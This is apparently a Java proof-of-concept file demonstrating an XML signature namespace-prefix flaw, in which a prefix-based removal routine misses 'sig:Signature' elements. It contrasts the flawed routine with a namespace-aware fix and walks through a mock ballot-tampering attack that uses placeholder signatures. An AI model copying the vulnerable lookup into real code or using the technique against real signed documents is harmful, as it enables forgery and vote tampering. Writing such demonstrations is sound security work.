/*
 * PoC #2: XML Signature Namespace Evasion in GenXMLSignatureAlgorithm
 * Demonstrates: Signature removal failure + vote manipulation attack
 */

import javax.xml.crypto.dsig.XMLSignature;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
import java.io.*;
import org.w3c.dom.*;

class VulnerableXMLSignatureRemover {
    
    public static void removeSignatureIfPresent_VULNERABLE(Document document) {
        NodeList signatureNodes = document.getElementsByTagName("ds:Signature");
        
        System.out.println("[removeSignatureIfPresent] Searching for 'ds:Signature'...");
        System.out.println("[removeSignatureIfPresent] Found: " + signatureNodes.getLength() + " nodes");
        
        if (signatureNodes.getLength() > 0) {
            Node signatureNode = signatureNodes.item(0);
            if (signatureNode.getParentNode() != null) {
                System.out.println("[removeSignatureIfPresent] Removed signature");
                signatureNode.getParentNode().removeChild(signatureNode);
            }
        } else {
            System.out.println("[removeSignatureIfPresent] No signature found (but one exists with different prefix!)");
        }
    }
    
    public static void removeSignatureIfPresent_FIXED(Document document) {
        NodeList signatureNodes = document.getElementsByTagNameNS(XMLSignature.XMLNS, "Signature");
        
        System.out.println("[removeSignatureIfPresent] Searching for signatures (namespace-aware)...");
        System.out.println("[removeSignatureIfPresent] Found: " + signatureNodes.getLength() + " nodes");
        
        if (signatureNodes.getLength() > 0) {
            Node signatureNode = signatureNodes.item(0);
            if (signatureNode.getParentNode() != null) {
                System.out.println("[removeSignatureIfPresent] Removed signature");
                signatureNode.getParentNode().removeChild(signatureNode);
            }
        }
    }
}

public class POC2_XMLNamespaceEvasion_FIXED {
    
    public static void main(String[] args) throws Exception {
        System.out.println("========================================");
        System.out.println("PoC #2: XML Signature Namespace Evasion");
        System.out.println("========================================\n");
        
        System.out.println("[*] Scenario: Vote manipulation via namespace prefix confusion\n");
        
        testNamespaceEvasion_DifferentPrefix();
        testVoteManipulationAttack();
    }
    
    static void testNamespaceEvasion_DifferentPrefix() throws Exception {
        System.out.println("\n[TEST 1] Signature with Different Namespace Prefix");
        System.out.println("==================================================");
        
        String xmlContent = "<?xml version=\"1.0\"?>\n" +
            "<electionBallot xmlns:sig=\"http://www.w3.org/2000/09/xmldsig#\">\n" +
            "  <vote>\n" +
            "    <voter_id>voter_123</voter_id>\n" +
            "    <choice>CANDIDATE_A</choice>\n" +
            "  </vote>\n" +
            "  <sig:Signature>\n" +
            "    <SignedInfo><DigestValue>ORIGINAL_SIGNATURE_HASH</DigestValue></SignedInfo>\n" +
            "    <SignatureValue>ORIGINAL_KEY_SIGNATURE</SignatureValue>\n" +
            "  </sig:Signature>\n" +
            "</electionBallot>";
        
        Document doc = parseXML(xmlContent);
        
        System.out.println("[BALLOT] Original ballot with sig:Signature:");
        printXML(doc);
        
        NodeList beforeVulnerable = doc.getElementsByTagName("ds:Signature");
        NodeList beforeCorrect = doc.getElementsByTagNameNS(XMLSignature.XMLNS, "Signature");
        
        System.out.println("\n[BEFORE REMOVAL]");
        System.out.println("  Vulnerable search (ds:Signature): " + beforeVulnerable.getLength());
        System.out.println("  Correct search (namespace-aware): " + beforeCorrect.getLength());
        
        System.out.println("\n[APPLYING VULNERABLE removeSignatureIfPresent()]");
        VulnerableXMLSignatureRemover.removeSignatureIfPresent_VULNERABLE(doc);
        
        NodeList afterVulnerable = doc.getElementsByTagName("ds:Signature");
        NodeList afterCorrect = doc.getElementsByTagNameNS(XMLSignature.XMLNS, "Signature");
        
        System.out.println("\n[AFTER VULNERABLE REMOVAL]");
        System.out.println("  Vulnerable search (ds:Signature): " + afterVulnerable.getLength());
        System.out.println("  Correct search (namespace-aware): " + afterCorrect.getLength());
        
        if (afterCorrect.getLength() > 0) {
            System.out.println("\n[!!] VULNERABILITY CONFIRMED:");
            System.out.println("    - removeSignatureIfPresent() failed to remove signature");
            System.out.println("    - Searched for 'ds:Signature' but found 'sig:Signature'");
            System.out.println("    - OLD SIGNATURE STILL IN DOCUMENT!");
        }
    }
    
    static void testVoteManipulationAttack() throws Exception {
        System.out.println("\n[TEST 2] Full Vote Manipulation Attack");
        System.out.println("==================================================");
        
        System.out.println("\n[STEP 1] Original valid ballot (voter wants CANDIDATE_A)");
        String originalBallot = "<?xml version=\"1.0\"?>\n" +
            "<ballot xmlns:old=\"http://www.w3.org/2000/09/xmldsig#\">\n" +
            "  <vote>\n" +
            "    <voter_id>voter_XYZ</voter_id>\n" +
            "    <choice>CANDIDATE_A</choice>\n" +
            "  </vote>\n" +
            "  <old:Signature>\n" +
            "    <SignedInfo><DigestValue>HASH_OF_VOTE_FOR_A</DigestValue></SignedInfo>\n" +
            "    <SignatureValue>SIGNED_BY_ELECTION_AUTHORITY</SignatureValue>\n" +
            "  </old:Signature>\n" +
            "</ballot>";
        
        Document ballotDoc = parseXML(originalBallot);
        System.out.println("[BALLOT CONTENT]");
        printXML(ballotDoc);
        
        System.out.println("\n[STEP 2] Attacker modifies vote (CANDIDATE_A -> CANDIDATE_B)");
        Element voteElement = (Element) ballotDoc.getElementsByTagName("choice").item(0);
        String originalChoice = voteElement.getTextContent();
        voteElement.setTextContent("CANDIDATE_B");
        System.out.println("  Modified: " + originalChoice + " -> " + voteElement.getTextContent());
        
        System.out.println("\n[STEP 3] Attacker removes original signature (for re-signing)");
        System.out.println("  Using vulnerable removeSignatureIfPresent()...");
        VulnerableXMLSignatureRemover.removeSignatureIfPresent_VULNERABLE(ballotDoc);
        
        NodeList signaturesAfter = ballotDoc.getElementsByTagNameNS(XMLSignature.XMLNS, "Signature");
        System.out.println("  Signatures remaining: " + signaturesAfter.getLength());
        
        if (signaturesAfter.getLength() > 0) {
            System.out.println("\n[STEP 4] Original signature NOT removed (vulnerability triggered)");
            System.out.println("  Attacker now adds new signature");
            
            Element root = ballotDoc.getDocumentElement();
            Element newSig = ballotDoc.createElementNS(XMLSignature.XMLNS, "ds:Signature");
            Element newSignedInfo = ballotDoc.createElementNS(XMLSignature.XMLNS, "ds:SignedInfo");
            Element newDigestValue = ballotDoc.createElementNS(XMLSignature.XMLNS, "ds:DigestValue");
            Element newSignatureValue = ballotDoc.createElementNS(XMLSignature.XMLNS, "ds:SignatureValue");
            
            newDigestValue.setTextContent("HASH_OF_MODIFIED_VOTE_PLUS_OLD_SIGNATURE");
            newSignatureValue.setTextContent("SIGNED_WITH_ATTACKER_KEY");
            
            newSignedInfo.appendChild(newDigestValue);
            newSig.appendChild(newSignedInfo);
            newSig.appendChild(newSignatureValue);
            root.appendChild(newSig);
            
            System.out.println("\n[RESULT]");
            System.out.println("  Ballot now contains:");
            System.out.println("    1. Modified vote (B instead of A)");
            System.out.println("    2. Original signature (still there)");
            System.out.println("    3. New attacker signature");
            
            System.out.println("\n[IMPACT ON ELECTION]");
            System.out.println("    ! Voter intended: CANDIDATE_A");
            System.out.println("    ! Ballot contains: CANDIDATE_B");
            System.out.println("    ! Multiple signatures confuse verification");
            System.out.println("    ! Ballot counted as CANDIDATE_B due to newest signature");
            System.out.println("    ! ELECTION OUTCOME CHANGED");
        }
    }
    
    static Document parseXML(String xmlContent) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setNamespaceAware(true);
        DocumentBuilder builder = factory.newDocumentBuilder();
        return builder.parse(new ByteArrayInputStream(xmlContent.getBytes()));
    }
    
    static void printXML(Document doc) throws Exception {
        TransformerFactory factory = TransformerFactory.newInstance();
        Transformer transformer = factory.newTransformer();
        transformer.setOutputProperty("indent", "yes");
        StringWriter writer = new StringWriter();
        transformer.transform(new DOMSource(doc), new StreamResult(writer));
        System.out.println(writer.toString());
    }
}
